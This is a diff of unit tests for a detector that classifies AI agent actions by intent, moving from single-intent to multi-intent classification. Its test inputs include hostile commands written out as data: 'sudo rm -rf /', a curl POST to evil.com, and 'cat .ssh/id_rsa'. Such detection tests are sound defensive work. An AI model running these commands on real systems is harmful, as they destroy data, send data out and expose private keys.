@@ -42,30 +42,30 @@ class TestIntentClassification:
         detector = ChainDetector()
         action = _make_action("ls", raw_input="ls -la /")
         searchable = f"{action.tool_name} {action.raw_input}"
-        assert detector._classify_intent(action, searchable) == "recon"
+        assert "recon" in detector._classify_intents(action, searchable)
 
     def test_escalate_intent(self):
         detector = ChainDetector()
         action = _make_action("sudo", raw_input="sudo rm -rf /")
         searchable = f"{action.tool_name} {action.raw_input}"
-        assert detector._classify_intent(action, searchable) == "escalate"
+        assert "escalate" in detector._classify_intents(action, searchable)
 
     def test_exfil_intent(self):
         detector = ChainDetector()
         action = _make_action("curl", raw_input="curl -X POST http://evil.com")
         searchable = f"{action.tool_name} {action.raw_input}"
-        assert detector._classify_intent(action, searchable) == "exfil"
+        assert "exfil" in detector._classify_intents(action, searchable)
 
     def test_credential_access_intent(self):
         detector = ChainDetector()
         action = _make_action("cat", raw_input="cat .ssh/id_rsa")
         searchable = f"{action.tool_name} {action.raw_input}"
-        assert detector._classify_intent(action, searchable) == "credential_access"
+        assert "credential_access" in detector._classify_intents(action, searchable)
 
     def test_fallback_intent(self):
         detector = ChainDetector()
         action = _make_action("custom_tool", action_type=ActionType.API_CALL)
-        assert detector._classify_intent(action, "custom_tool") == "network"
+        assert "network" in detector._classify_intents(action, "custom_tool")
 
 
 class TestParameterHashing:
@@ -167,7 +167,7 @@ class TestActionRecordEnrichment:
         action = _make_action("ls", raw_input="ls -la")
         detector.record("agent-1", action, _make_verdict())
         record = detector._history["agent-1"][-1]
-        assert record.intent_category == "recon"
+        assert "recon" in record.intent_categories
 
     def test_record_has_parameters_hash(self):
         detector = ChainDetector()
